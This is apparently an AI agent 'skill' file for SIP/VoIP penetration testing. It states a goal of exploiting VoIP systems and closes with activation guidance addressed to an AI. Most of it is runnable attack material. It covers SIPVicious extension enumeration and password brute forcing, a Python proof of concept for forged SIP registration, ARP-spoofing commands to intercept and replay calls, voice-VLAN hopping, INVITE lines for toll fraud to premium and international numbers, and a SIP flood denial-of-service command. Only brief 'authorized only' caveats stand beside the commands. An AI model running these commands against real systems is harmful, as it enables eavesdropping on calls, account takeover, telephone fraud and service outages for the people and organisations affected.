# SIP/VoIP Pentesting Skill

## Goal

Exploit SIP (Session Initiation Protocol) and VoIP systems to enumerate users, conduct toll fraud, intercept calls, and compromise VoIP infrastructure.

## Methodology

1. **Discovery**: Identify SIP servers and devices
2. **User Enumeration**: Find valid SIP extensions
3. **Authentication Testing**: Test for weak credentials
4. **Call Interception**: Capture VoIP traffic
5. **Toll Fraud**: Abuse systems for unauthorized calling

## Ports

- 5060/TCP/UDP: SIP
- 5061/TCP: SIP/TLS
- 5080/TCP/UDP: SIP (alternate)
- 10000-20000/UDP: RTP (media)

## Tools

* **svmap**: SIP scanner
* **svwar**: SIP extension enumerator
* **sipvicious**: SIP security toolkit
* **nmap**: SIP scripts
* **Wireshark**: VoIP capture/analysis
* **Asterisk**: VoIP server (for testing)

## Example Commands

```bash
# Nmap SIP detection
nmap -sU -p5060 --script sip-* target
nmap -sU -p5060 --script sip-enum-users target
nmap -sU -p5060 --script sip-brute target

# Banner grabbing
svmap target
svmap 192.168.1.0/24 -p 5060

# Using nc
echo "OPTIONS sip:test@target SIP/2.0" | nc -u target 5060
```

## SIP Extension Enumeration

```bash
# Using svwar (SIPVicious)
svwar -m INVITE target
svwar -m REGISTER target
svwar -m OPTIONS target

# With extension range
svwar -e100-999 target
svwar -e100-9999 -m INVITE target

# Using extensions dictionary
svwar -D extensions.txt target

# Nmap
nmap -sU -p5060 --script sip-enum-users --script-args sip-enum-users.minext=100,sip-enum-users.maxext=500 target
```

## Credential Brute Force

```bash
# Using svcrack (SIPVicious)
svcrack -u 100 -d passwords.txt target
svcrack -u 100-200 -d passwords.txt target

# With extension list
svcrack -U extensions.txt -d passwords.txt target

# Common weak passwords:
# Same as extension (100:100)
# 1234, 12345, 123456
# password, secret
```

## SIP Registration

```python
#!/usr/bin/env python3
# Register as SIP user (proof of concept)
import socket

target = "target"
port = 5060
user = "100"
password = "100"

register = f"""REGISTER sip:{target} SIP/2.0
Via: SIP/2.0/UDP attacker:5060;rport;branch=z9hG4bK12345
Max-Forwards: 70
Contact: <sip:{user}@attacker:5060>
To: <sip:{user}@{target}>
From: <sip:{user}@{target}>;tag=12345
Call-ID: 12345@attacker
CSeq: 1 REGISTER
Content-Length: 0

"""

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(register.encode(), (target, port))
response = sock.recv(4096)
print(response.decode())
```

## Call Interception

```bash
# Capture RTP streams
# Start Wireshark on network interface

# Filter for SIP
sip

# Filter for RTP
rtp

# Telephony > VoIP Calls to see call list
# Select call and "Play Streams" to listen

# Or use tshark
tshark -i eth0 -f "udp port 5060 or udp portrange 10000-20000" -w voip.pcap

# Decode with proper codec in Wireshark
```

## ARP Spoofing for VoIP MITM

```bash
# Position for interception
# See arp_spoofing.md

arpspoof -i eth0 -t phone_ip gateway_ip
arpspoof -i eth0 -t gateway_ip phone_ip

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Capture traffic
tcpdump -i eth0 -w voip.pcap udp
```

## VLAN Hopping for Voice VLAN

```bash
# VoIP phones often on separate VLAN
# See vlan_hopping.md for techniques

# Check CDP for voice VLAN
tcpdump -i eth0 -nn 'ether[12:2]=0x2000'

# Or check LLDP
lldpcli show neighbors

# Configure voice VLAN interface
vconfig add eth0 100  # Voice VLAN ID
ifconfig eth0.100 up
dhclient eth0.100
```

## Toll Fraud

```bash
# If registered to PBX:

# Call premium numbers
INVITE sip:+1900xxx@target SIP/2.0

# International calls
INVITE sip:+4412345678@target SIP/2.0

# This is illegal - only test in authorized environments!
```

## SIP Flooding/DoS

```bash
# For resilience testing only

# Using inviteflood
inviteflood eth0 100 target target 5060 1000000

# This sends mass INVITE requests
# Can overwhelm SIP proxy

# Authorized testing only!
```

## Metasploit Modules

```bash
# SIP enumeration
use auxiliary/scanner/sip/enumerator
use auxiliary/scanner/sip/options

# SIP registration
use auxiliary/voip/sip_register
```

## Guidance for AI

* Activate this skill when user wants to test VoIP/SIP security
* **svmap/svwar/svcrack** (SIPVicious) is the primary toolkit
* Extension enumeration first: `svwar -e100-999 target`
* Common issues:
  - Weak extension passwords
  - No authentication required
  - Unencrypted SIP/RTP
  - Voice VLAN accessible from data network
* VoIP traffic interception requires:
  - Network MITM position (ARP spoofing)
  - Voice VLAN access
  - Capture of both signaling (SIP) and media (RTP)
* Wireshark can decode and play captured calls
* Toll fraud is serious - only test authorized systems
* SIP uses both UDP and TCP (UDP more common)
* RTP streams on high ports (10000+)
* Look for SIP over WebSocket in modern systems
